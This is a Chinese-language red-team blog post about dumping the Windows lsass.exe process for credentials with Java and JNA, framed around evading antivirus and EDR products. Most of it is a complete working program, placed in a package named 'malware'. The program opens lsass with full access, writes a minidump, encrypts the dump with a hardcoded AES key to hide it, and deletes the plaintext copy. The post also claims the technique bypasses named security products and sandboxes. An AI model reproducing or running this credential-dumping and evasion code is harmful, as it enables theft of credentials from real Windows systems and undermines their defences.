全新视角下的 Java：一种全新的方式实现完美 dump lsass

引言：常规战术的困境

在现代红队与APT行动中，dumplsass.exe进程获取凭据几乎是渗透测试和权限维持的标配。然而，随着安全厂商不断更新规则，以 C/C++ 编写的传统加载器已面临“灭绝性打击”：静态签名、行为特征、系统 API 调用序列，一切都在被严密监控。

即使使用手工加载 shellcode、syscall 替代、内联汇编绕过等复杂技术，依然有概率被 EDR 标记为恶意行为。在这种“卷到极致”的环境下，反而是那些“不常见”的技术栈成了突破口。

思路转变：Java，非典型免杀载体

Java 听上去是高层语言，和“内存操作”似乎不搭边。但实际上借助 JNA (Java Native Access)，Java 完全可以调用底层 Windows API，完成诸如：

  • 分配可执行内存（VirtualAlloc）
  • 写入 shellcode
  • 创建线程执行（CreateThread）
  • dump 敏感进程（MiniDumpWriteDump）

相比传统方式，Java 具备以下天然优势：

结构复杂、静态难分析

字节码格式非标准 PE 文件，无导入表、无特征段落、杀软难提取行为模式。

天然免疫沙箱,无需任何反沙箱手法,环境偏好型特性

多数沙箱无法模拟jar包运行可完全绕过沙箱，不会主动加载 JVM。而很多检测引擎默认只追踪.exe、.dll等常规载荷。

生态丰富、调用自由

通过JNA可以快速封装所有 WinAPI，无需 JNI 编译 DLL，调用链极其灵活，可自定义行为、变形空间大。

核心实现：在 JVM 中 dump lsass 并加密清理

以下是我们实现的关键功能流程：

  1. 使用OpenProcess打开 lsass.exe
  2. 用CreateFileA创建临时 dump 文件
  3. 调用MiniDumpWriteDump写入 dump
  4. 使用 AES 加密 dump 文件
  5. 删除原始明文 dump（只保留加密结果）

完整代码 可以完美绕过火绒和核晶

package malware;

import com.sun.jna.*;
import com.sun.jna.win32.StdCallLibrary;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;

public class test2 {

public interface MiniDumpWriter extends Library {
MiniDumpWriter INSTANCE = Native.load(“DbgHelp”, MiniDumpWriter.class);

boolean MiniDumpWriteDump(
Pointer hProcess,
int ProcessId,
Pointer hFile,
int DumpType,
Pointer ExceptionParam,
Pointer UserStreamParam,
Pointer CallbackParam
);
}

public interface Kernel32 extends StdCallLibrary {
Kernel32 INSTANCE = Native.load(“kernel32”, Kernel32.class);

int PROCESS_ALL_ACCESS = 0x1F0FFF;
int GENERIC_WRITE = 0x40000000;
int CREATE_ALWAYS = 2;
int FILE_ATTRIBUTE_NORMAL = 0x80;

Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, int dwProcessId);
Pointer CreateFile(String lpFileName, int dwDesiredAccess, int dwShareMode,
Pointer lpSecurityAttributes, int dwCreationDisposition,
int dwFlagsAndAttributes, Pointer hTemplateFile);
boolean CloseHandle(Pointer hObject);
Pointer CreateFileA(
String lpFileName,
int dwDesiredAccess,
int dwShareMode,
Pointer lpSecurityAttributes,
int dwCreationDisposition,
int dwFlagsAndAttributes,
Pointer hTemplateFile
);
}

public static void main(String[] args) throws Exception {

int lsassPid = Integer.parseInt(args[0]);
if (lsassPid == -1) {
System.out.println(“[-] Cannot find .”);
return;
}

Pointer hProcess = Kernel32.INSTANCE.OpenProcess(Kernel32.PROCESS_ALL_ACCESS, false, lsassPid);
if (Pointer.nativeValue(hProcess) == 0) {
System.out.println(“[-] Failed to open . Try running as administrator.”);
return;
}

String rawPath = “cc.cc”;
String encPath = “pp.pp”;

Pointer hFile = Kernel32.INSTANCE.CreateFileA(
rawPath,
Kernel32.GENERIC_WRITE,
0,
null,
Kernel32.CREATE_ALWAYS,
Kernel32.FILE_ATTRIBUTE_NORMAL,
null
);

if (Pointer.nativeValue(hFile) == 0) {
System.out.println(“[-] Failed to create file.”);
return;
}

boolean success = MiniDumpWriter.INSTANCE.MiniDumpWriteDump(
hProcess,
lsassPid,
hFile,
2,
null, null, null
);

if (success) {
System.out.println(“[+] success: “ + rawPath);

byte[] key = Arrays.copyOf(“mysecretpassword”.getBytes(), 16);
encryptFile(rawPath, encPath, key);
System.out.println(“[+] Encrypted to: “ + encPath);

Files.deleteIfExists(Path.of(rawPath));
System.out.println(“[+] Raw file deleted.”);
} else {
System.out.println(“[-] failed.”);
}

Kernel32.INSTANCE.CloseHandle(hFile);
Kernel32.INSTANCE.CloseHandle(hProcess);
}

public static void encryptFile(String inputPath, String outputPath, byte[] keyBytes) throws Exception {
SecretKeySpec key = new SecretKeySpec(keyBytes, “AES”);
Cipher cipher = Cipher.getInstance(“AES”);

cipher.init(Cipher.ENCRYPT_MODE, key);
byte[] inputBytes = Files.readAllBytes(Path.of(inputPath));
byte[] encryptedBytes = cipher.doFinal(inputBytes);

try (FileOutputStream fos = new FileOutputStream(outputPath)) {
fos.write(encryptedBytes);
}
}
}
